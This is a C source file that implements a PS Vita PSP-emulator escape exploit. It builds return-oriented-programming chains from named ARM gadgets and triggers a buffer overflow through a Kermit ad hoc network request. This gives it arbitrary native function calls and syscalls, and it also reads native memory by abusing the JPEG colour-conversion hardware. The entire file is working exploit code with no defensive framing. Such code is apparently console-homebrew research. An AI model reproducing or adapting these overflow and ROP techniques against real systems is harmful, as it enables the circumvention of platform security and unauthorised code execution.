/* rpc.c -- implementation of the emulator escape
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <pspctrl.h>

#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "main.h"
#include "arm.h"
#include "mips.h"
#include "rpc.h"
#include "rop.h"
#include "gadgets.h"

#include "library/libkernel.h"

// Wrappers
int (* read_native)(void *dst, u32 src, size_t len) = (void *)&sceCtrlPeekBufferPositive;
int (* syscall)(int num, ...) = (void *)&sceCtrlPeekBufferNegative;
int (* call)(int func, ...) = (void *)&sceCtrlReadBufferPositive;
int (* init_rpc)(u32 cookie, u32 pspemu_base, u32 libkernel_base) = (void *)&sceCtrlReadBufferNegative;

static u32 stack_cookie, stack_pointer;

static void jpeg_csc(void *pRGBA, const void *pYCbCr, int width, int height, int iFrameWidth, int mode, int addr) {
  int work = 0;
  _sceKernelDcacheWritebackInvalidateAll();
  _sceMeRequest(ME_CMD_CSC_INIT, work, pRGBA, pYCbCr, width, height, mode, 0, iFrameWidth);
  _sceMeRequest(ME_CMD_CSC_ROW,  work, addr / width, mode);
}

int _read_native(void *dst, u32 src, size_t len) {
  int k1 = pspSdkSetK1(0);

  size_t i;
  for (i = 0; i < ALIGN(len, 16); i += 16) {
    /*
      1. Copy temp containing Y, Cb and Cr, each of size 8 * 16, into ScePspemuJpegYuvFrameBuffer.
      2. Copy 16 bytes of src into Y component of ScePspemuJpegYuvFrameBuffer.
      3. Copy ScePspemuJpegYuvFrameBuffer into ScePspemuJpegYuvFrameBuffer (no change).
      4. Apply csc on ScePspemuJpegYuvFrameBuffer, where Y contains src and both Cb and Cr are filled with the value 128.
      5. Read every fourth byte of output.
    */

    u8 *temp = (u8 *)0xABCD0000;
    memset(temp, 128, 3 * 8 * 16);
    jpeg_csc(temp, (void *)0x08000000, 8, 16, 8, 0b0101, NATIVE(temp));
    jpeg_csc(temp, (void *)0x08000000, 1,  0, 1, 0b0101, src + i);
    jpeg_csc(temp, (void *)0x08000000, 8, 16, 8, 0b0101, 0x66a00000); // ScePspemuJpegYuvFrameBuffer

    size_t j;
    for (j = 0; j < MIN(len - i, 16); j++)
      ((u8 *)dst)[i + j] = temp[j * 4];
  }

  pspSdkSetK1(k1);
  return 0;
}

void push_call(int func, ...) {
  va_list ap;
  va_start(ap, func);
  push(2, SceLibKernel_pop_r0_pc);              // pc
  push(0, va_arg(ap, int));                     // r0
  push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
  push(0, va_arg(ap, int));                     // r1
  push(0, va_arg(ap, int));                     // r2
  push(2, SceLibKernel_add_sp_8_pop_r4_pc);     // r3
  push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
  push(0, 0xDEADBEEF);                          // dummy
  push(0, 0xDEADBEEF);                          // dummy
  push(0, 0xDEADBEEF);                          // r4
  push(2, SceLibKernel_pop_r3_pc);              // pc
  push(0, va_arg(ap, int));                     // r3
  push(0, func);                                // pc
  push(0, va_arg(ap, int));                     // on stack
  push(0, va_arg(ap, int));                     // on stack
  push(0, va_arg(ap, int));                     // r4
  va_end(ap);
}

void push_syscall(int num, ...) {
  va_list ap;
  va_start(ap, num);
  push(2, SceLibKernel_pop_r0_pc);              // pc
  push(0, va_arg(ap, int));                     // r0
  push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
  push(0, va_arg(ap, int));                     // r1
  push(0, va_arg(ap, int));                     // r2
  push(2, SceLibKernel_pop_pc);                 // r3
  push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
  push(2, SceLibKernel_pop_r3_pc);              // pc
  push(0, va_arg(ap, int));                     // r3
  push(2, SceLibKernel_pop_ip_pc);              // pc
  push(0, num);                                 // ip
  push(1, ScePspemu_syscall);                   // pc
  va_end(ap);
}

static void push_pivot(u32 dst, void *src, int size) {
  push(2, SceLibKernel_pop_r0_pc);              // pc
  push(0, dst);                                 // r0
  push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
  push(0, NATIVE(src));                         // r1
  push(0, size);                                // r2
  push(2, SceLibKernel_pop_pc);                 // r3
  push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
  push(2, SceLibKernel_sceClibMemcpy);          // pc
  push(2, SceLibKernel_pop_ip_pc);              // pc
  push(0, dst);                                 // ip
  push(2, SceLibKernel_mov_sp_ip_pop_pc);       // pc
}

static void push_prologue(u32 r4, u32 r5, u32 r6, u32 r7) {
  push(0, stack_cookie);                        // stack cookie
  push(0, r4);                                  // r4
  push(0, r5);                                  // r5
  push(0, r6);                                  // r6
  push(0, r7);                                  // r7
  push(0, 0xDEADBEEF);                          // r8
}

static void push_epilogue(void *request) {
  push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
  push(0, stack_pointer + 0x14);                // r1
  push(0, NATIVE(request));                     // r2
  push(2, SceLibKernel_pop_pc);                 // r3
  push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
  push(1, ScePspemu_str_r2_r1_bx_lr);           // r3
  push(1, ScePspemu_remoteNetAdhocCreate_lr);   // pc
}

int _syscall(int num, ...) {
  int k1 = pspSdkSetK1(0);
  int intc = pspSdkDisableInterrupts();

  char request[sizeof(KermitRequest) + 0x40];
  KermitRequest *request_aligned = (KermitRequest *)ALIGN((u32)request, 0x40);
  KermitRequest *request_uncached = (KermitRequest *)((u32)request_aligned | 0x20000000);
  _sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

  u32 second_rop[64];
  begin_rop(second_rop, sizeof(second_rop));

  // Setup syscall invocation
  va_list ap;
  va_start(ap, num);
  push_syscall(num,
               va_arg(ap, int), va_arg(ap, int),
               va_arg(ap, int), va_arg(ap, int));
  va_end(ap);

  push_epilogue(request_uncached);

  int second_rop_size = end_rop();

  u32 rop[32];
  begin_rop(rop, sizeof(rop));

  push_prologue(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
  push_pivot(stack_pointer - second_rop_size, second_rop, second_rop_size);

  int rop_size = end_rop();

  // Init param
  KermitAdhocCreateParam param;
  memset(&param, 0, sizeof(param));
  memcpy(param.buf + 0x7c, rop, rop_size);
  param.bufsize = 0x7c + rop_size;

  _sceKernelDcacheWritebackInvalidateAll();
  pspSdkEnableInterrupts(intc);

  // Trigger overflow
  u64 resp;
  _sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
  _sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

  pspSdkSetK1(k1);
  return (int)resp;
}

int _call(int func, ...) {
  int k1 = pspSdkSetK1(0);
  int intc = pspSdkDisableInterrupts();

  char request[sizeof(KermitRequest) + 0x40];
  KermitRequest *request_aligned = (KermitRequest *)ALIGN((u32)request, 0x40);
  KermitRequest *request_uncached = (KermitRequest *)((u32)request_aligned | 0x20000000);
  _sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

  u32 second_rop[64];
  begin_rop(second_rop, sizeof(second_rop));

  // Setup function invocation
  va_list ap;
  va_start(ap, func);
  push_call(func,
            va_arg(ap, int), va_arg(ap, int),
            va_arg(ap, int), va_arg(ap, int),
            va_arg(ap, int), va_arg(ap, int),
            va_arg(ap, int), va_arg(ap, int),
            va_arg(ap, int));
  va_end(ap);

  push_epilogue(request_uncached);

  int second_rop_size = end_rop();

  u32 rop[32];
  begin_rop(rop, sizeof(rop));

  push_prologue(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF);
  push_pivot(stack_pointer - second_rop_size, second_rop, second_rop_size);

  int rop_size = end_rop();

  // Init param
  KermitAdhocCreateParam param;
  memset(&param, 0, sizeof(param));
  memcpy(param.buf + 0x7c, rop, rop_size);
  param.bufsize = 0x7c + rop_size;

  _sceKernelDcacheWritebackInvalidateAll();
  pspSdkEnableInterrupts(intc);

  // Trigger overflow
  u64 resp;
  _sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
  _sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

  pspSdkSetK1(k1);
  return (int)resp;
}

int _init_rpc(u32 cookie, u32 pspemu_base, u32 libkernel_base) {
  int k1 = pspSdkSetK1(0);
  int intc = pspSdkDisableInterrupts();

  char request[sizeof(KermitRequest) + 0x40];
  KermitRequest *request_aligned = (KermitRequest *)ALIGN((u32)request, 0x40);
  KermitRequest *request_uncached = (KermitRequest *)((u32)request_aligned | 0x20000000);
  _sceKernelDcacheInvalidateRange(request_aligned, sizeof(KermitRequest));

  stack_cookie = cookie;
  stack_pointer = 0;

  register_base(1, pspemu_base);
  register_base(2, libkernel_base);

  u32 rop[32];
  begin_rop(rop, sizeof(rop));

  push_prologue(0xDEADBEEF, 0xDEADBEEF, 0xDEADBEEF, libkernel_base + SceLibKernel_subs_r0_r1_r0_pop_pc);

  // Get stack pointer and restore context
  push(2, SceLibKernel_pop_r0_r1_pc);           // pc
  push(0, 0x5c + 0x10);                         // r0
  push(0, 0);                                   // r1
  push(2, SceLibKernel_add_r1_sp_5c_blx_r7);    // pc
  push(2, SceLibKernel_pop_r1_r2_r3_pc);        // pc
  push(0, NATIVE(&stack_pointer));              // r1
  push(0, NATIVE(request_uncached));            // r2 sp+0x14 must point to request
  push(2, SceLibKernel_pop_pc);                 // r3
  push(1, ScePspemu_mov_lr_r3_bx_lr);           // pc
  push(2, SceLibKernel_mov_ip_r0_bx_lr);        // pc
  push(1, ScePspemu_str_r0_r1_bx_lr);           // pc
  push(2, SceLibKernel_pop_r3_pc);              // pc
  push(1, ScePspemu_remoteNetAdhocCreate_lr);   // r3
  push(1, ScePspemu_str_r3_r0_movs_r0_0_bx_lr); // pc
  push(2, SceLibKernel_mov_sp_ip_pop_pc);       // pc

  int rop_size = end_rop();

  // Init param
  KermitAdhocCreateParam param;
  memset(&param, 0, sizeof(param));
  memcpy(param.buf + 0x7c, rop, rop_size);
  param.bufsize = 0x7c + rop_size;

  _sceKernelDcacheWritebackInvalidateAll();
  pspSdkEnableInterrupts(intc);

  // Trigger overflow
  u64 resp;
  _sceKermitMemoryArgument(request_uncached, 0, &param, sizeof(param), KERMIT_INPUT_MODE);
  _sceKermitRequest(request_uncached, KERMIT_MODE_WLAN, KERMIT_CMD_ADHOC_CREATE, 1, 0, &resp);

  stack_pointer += 4;

  pspSdkSetK1(k1);
  return stack_pointer;
}
